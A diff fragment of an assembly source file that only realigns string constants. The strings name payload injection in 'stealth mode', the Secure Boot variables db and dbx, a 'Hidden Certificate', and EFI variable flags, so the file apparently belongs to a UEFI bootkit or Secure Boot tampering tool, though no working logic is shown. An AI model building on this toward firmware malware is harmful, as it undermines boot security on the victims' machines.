@@ -8,14 +8,14 @@
 
 section .data
     success_message 		db 		"{[+]} Payload injected and running stealth mode", 0
-    fail_message 			db 		"{[-]} Injection failed, retrying...", 0
-    error_message 			db 		"{[-]} Error during payload injection", 0
+    fail_message 		db 		"{[-]} Injection failed, retrying...", 0
+    error_message 		db 		"{[-]} Error during payload injection", 0
     stealth_mode_enabled 	db 		"{[+]} Stealth mode enabled", 0
     stealth_mode_disabled 	db 		"{[-]} Stealth mode failed", 0
-    SecureBootVar 			db 		"SecureBoot", 0
-    dbVar 					db 		"db", 0
-    dbxVar 					db 		"dbx", 0
-    hidden_message 			db 		"Hidden Certificate", 0
+    SecureBootVar 		db 		"SecureBoot", 0
+    dbVar 			db 		"db", 0
+    dbxVar 			db 		"dbx", 0
+    hidden_message 		db 		"Hidden Certificate", 0
 
 %define EFI_VARIABLE_NON_VOLATILE    0x00000001
 %define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002
